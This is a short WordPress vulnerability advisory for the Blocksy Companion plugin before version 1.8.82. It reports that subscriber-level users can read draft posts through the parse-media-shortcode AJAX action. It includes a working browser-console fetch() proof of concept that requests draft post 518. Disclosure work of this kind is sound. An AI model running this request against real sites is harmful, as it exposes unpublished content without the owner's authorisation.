## WordPress Plugin Vulnerabilities

# Blocksy Companion < 1.8.82 - Subscriber+ Draft Post Access

### Description

The plugin does not ensure that posts to be accessed via a shortcode are already public and can be viewed, allowing any authenticated users, such as subscriber to access draft posts for example

### Proof of Concept

Run the below command in the developer console of the web browser while being on the blog as a subscriber user
fetch("/wp-admin/admin-ajax.php", {
"headers": {
"content-type": "application/x-www-form-urlencoded",
},
"method": "POST",
"body": "action=parse-media-shortcode&shortcode=[blocksy\_posts post\_ids='518']",
"credentials": "include"
}).then(response => response.text())
.then(data => console.log(data));
The title and content of the draft post with ID 518 will be displayed in the response
